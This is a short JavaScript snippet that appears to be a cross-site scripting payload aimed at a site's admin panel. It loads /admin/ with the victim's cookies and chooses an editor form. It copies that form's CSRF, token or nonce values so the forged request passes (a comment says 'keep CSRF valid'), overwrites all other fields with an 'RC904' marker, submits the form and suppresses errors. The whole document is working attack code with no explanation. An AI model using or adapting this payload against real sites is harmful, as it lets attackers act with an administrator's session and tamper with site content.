(async () => {
  const g = (u,o) => fetch(u, Object.assign({credentials:'include',cache:'no-store'}, o||{}));
  try {
    const admin = await (await g('/admin/')).text();
    const doc = new DOMParser().parseFromString(admin, 'text/html');
    const forms = [...doc.querySelectorAll('form')];
    // choose editor form: prefer one with a textarea; else the one whose action/id/class mentions page/home/content/edit; else largest
    let target = forms.find(f=>f.querySelector('textarea'));
    if(!target) target = forms.find(f=>/page|home|content|edit|site/i.test((f.getAttribute('action')||'')+(f.id||'')+(f.className||'')));
    if(!target) target = forms.sort((a,b)=>b.querySelectorAll('*').length-a.querySelectorAll('*').length)[0];
    if (target) {
      const action = target.getAttribute('action') || '/admin/';
      const method = (target.getAttribute('method')||'POST').toUpperCase();
      const fd = new FormData();
      for (const el of target.querySelectorAll('input,textarea,select,button')) {
        const nm = el.getAttribute('name'); if(!nm) continue;
        if (/csrf|token|nonce/i.test(nm)) { fd.set(nm, el.value||''); continue; } // keep CSRF valid
        fd.set(nm, 'FLD['+nm+']=RC904');
      }
      await g(action, {method, body: fd});
    }
  } catch(e){}
})();
